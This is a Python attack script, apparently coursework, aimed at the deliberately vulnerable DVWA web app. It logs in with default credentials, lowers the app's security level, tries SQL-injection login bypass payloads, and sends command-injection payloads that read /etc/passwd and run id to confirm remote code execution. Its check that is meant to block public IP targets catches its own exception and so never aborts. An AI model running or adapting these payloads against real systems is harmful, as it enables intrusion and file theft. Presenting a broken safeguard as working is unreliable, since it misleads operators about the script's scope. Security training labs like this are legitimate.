import requests
import logging
import ipaddress
import urllib.parse
import json 
import re
import socket
from datetime import datetime

# Configure logging module for this specific script
logger = logging.getLogger("CMD_INJECT")

class CommandInjector:
    def __init__(self, target_input):
        # Parse IP from URL if http/https scheme is present
        if "://" in target_input:
            self.target_ip = target_input.split("://")[1].split("/")[0]
        else:
            self.target_ip = target_input

        # Define standard DVWA attack paths
        self.base_url = f"http://{self.target_ip}/dvwa"
        self.login_url = f"{self.base_url}/login.php"
        self.security_url = f"{self.base_url}/security.php"
        self.vuln_url = f"{self.base_url}/vulnerabilities/exec/" 
        
        # Initialize session with standard User-Agent
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.logged_in = False
        
        # Safety check to ensure we are not attacking public IPs
        self.verify_lab_environment()

    def _log_event(self, event_type, details, severity="INFO"):
        """Structured JSON logging for SIEM integration."""
        log_payload = {
            "timestamp": datetime.utcnow().isoformat(),
            "module": "[web] CommandInjector",
            "event_type": event_type,
            "target": self.target_ip,
            "severity": severity,
            "details": details
        }
        msg = json.dumps(log_payload)
        
        if severity == "WARNING": logger.warning(msg)
        elif severity == "CRITICAL": logger.critical(msg)
        else: logger.info(msg)

    def verify_lab_environment(self):
        """Ensures target is a private/local IP to prevent accidental external attacks."""
        try:
            try: ip_addr = socket.gethostbyname(self.target_ip)
            except: ip_addr = self.target_ip

            ip_obj = ipaddress.ip_address(ip_addr)
            if not ip_obj.is_private and not ip_obj.is_loopback:
                msg = f"SAFETY VIOLATION: {self.target_ip} is PUBLIC. Aborting."
                self._log_event("SAFETY_VIOLATION", {"ip": self.target_ip}, severity="CRITICAL")
                raise ValueError(msg)
        except ValueError:
            pass

    def _get_csrf_token(self, html):
        """Extracts CSRF token from DVWA forms to enable valid POST requests."""
        match = re.search(r"name=['\"]user_token['\"].*?value=['\"]([a-f0-9]+)['\"]", html, re.DOTALL)
        if match: return match.group(1)
        match = re.search(r"value=['\"]([a-f0-9]+)['\"].*?name=['\"]user_token['\"]", html, re.DOTALL)
        if match: return match.group(1)
        return None

    def login(self, username="admin", password="password"):
        """Authenticates to DVWA and sets Security Level to Low."""
        print(f"[*] Authenticating to {self.login_url}...")
        try:
            try:
                resp = self.session.get(self.login_url, timeout=10)
            except requests.exceptions.ConnectionError:
                print("[-] Connection failed. Check Target IP.")
                return False

            token = self._get_csrf_token(resp.text)
            
            data = {'username': username, 'password': password, 'Login': 'Login'}
            if token:
                data['user_token'] = token
            else:
                print("[*] No token found (Metasploitable 2 / Old DVWA detected).")

            resp = self.session.post(self.login_url, data=data, allow_redirects=True)
            
            if "Welcome" in resp.text or "admin" in resp.text or "Logout" in resp.text:
                self.logged_in = True
                
                # 1. Change security level via POST (Server Side)
                sec_resp = self.session.get(self.security_url)
                sec_token = self._get_csrf_token(sec_resp.text)
                
                # Send both lowercase and uppercase submit keys for compatibility
                sec_data = {'security': 'low', 'seclev_submit': 'Submit'}
                if sec_token:
                    sec_data['user_token'] = sec_token
                
                self.session.post(self.security_url, data=sec_data)

                # 2. Force Cookie (Client Side Persistence)
                self.session.cookies.set('security', 'low', path='/', domain=self.target_ip)
                self.session.cookies.set('security', 'low', path='/dvwa', domain=self.target_ip)

                # 3. Verify
                check_resp = self.session.get(self.security_url)
                if "Security Level: low" in check_resp.text or "value=\"low\" selected=\"selected\"" in check_resp.text:
                    print("[+] Security Level successfully set to: Low")
                else:
                    print("[!] Warning: Could not verify Security Level change. Exploit might fail.")
                
                return True
            else:
                print("[-] Login failed.")
                return False

        except Exception as e:
            print(f"[!] Login Error: {e}")
        return False

    def test_auth_bypass(self):
        """Phase 4 Requirement: Test Authentication Bypass."""
        print(f"[*] Testing Authentication Bypass on {self.login_url}...")
        bypass_session = requests.Session()
        
        token = None
        try:
            r = bypass_session.get(self.login_url)
            token = self._get_csrf_token(r.text)
        except: pass

        payloads = ["admin' #", "admin' OR '1'='1' #"]
        
        for p in payloads:
            data = {'username': p, 'password': '123', 'Login': 'Login'}
            if token: data['user_token'] = token

            try:
                resp = bypass_session.post(self.login_url, data=data)
                if "Welcome" in resp.text or "admin" in resp.text:
                    msg = f"AUTH BYPASS SUCCESSFUL using payload: {p}"
                    print(f"[+] {msg}")
                    self._log_event("AUTH_BYPASS", {"payload": p}, severity="WARNING")
                    return f"Auth Bypass Success ({p})"
            except: pass
        
        print("[-] Auth Bypass checks finished.")
        return None

    def test_rce(self):
        """Phase 4 Requirement: Command Injection (RCE)."""
        if not self.logged_in:
            if not self.login(): return "Login Failed"

        print(f"[*] Testing Command Injection (RCE) on {self.vuln_url}...")
        param_name = "ip"

        # Payloads for Linux/Unix targets (DVWA standard)
        payloads = [
            "127.0.0.1; cat /etc/passwd", 
            "127.0.0.1 | cat /etc/passwd",
            "127.0.0.1; id",
            "127.0.0.1 && id"
        ]
        
        for p in payloads:
            try:
                # Refresh token/state
                get_resp = self.session.get(self.vuln_url)
                rce_token = self._get_csrf_token(get_resp.text)

                # Send BOTH 'Submit' and 'submit' to satisfy all DVWA versions
                data = {
                    param_name: p, 
                    'Submit': 'Submit', 
                    'submit': 'submit' 
                }
                
                if rce_token:
                    data['user_token'] = rce_token
                
                headers = {'Referer': self.vuln_url}

                # High timeout because the server attempts to ping first
                resp = self.session.post(self.vuln_url, data=data, headers=headers, timeout=25)
                
                # Check for indicators of success in response
                if "root:x:0:0" in resp.text or "uid=" in resp.text or "www-data" in resp.text or "daemon:" in resp.text:
                    
                    output_snippet = "Command Output Detected"
                    if "uid=" in resp.text:
                        match = re.search(r"(uid=[^\n<]+)", resp.text)
                        if match: output_snippet = match.group(1)
                    elif "root:x:0:0" in resp.text:
                        output_snippet = "File /etc/passwd read successfully"

                    msg = f"RCE CONFIRMED using payload: {p}"
                    print(f"[+] {msg}")
                    print(f"    -> System Response: {output_snippet}")
                    
                    self._log_event("RCE_DETECTED", {
                        "payload": p,
                        "output": output_snippet,
                        "impact": "Remote Code Execution"
                    }, severity="CRITICAL")
                    
                    return f"RCE Confirmed ({output_snippet})"

            except requests.exceptions.Timeout:
                print(f"[!] Warning: Request timed out for payload '{p}'.")
            except Exception as e:
                pass
                
        print("[-] Command Injection failed (or patched).")
        return None

if __name__ == "__main__":
    target_ip = input("Enter DVWA IP: ")
    injector = CommandInjector(target_ip)
    injector.test_auth_bypass()
    injector.test_rce()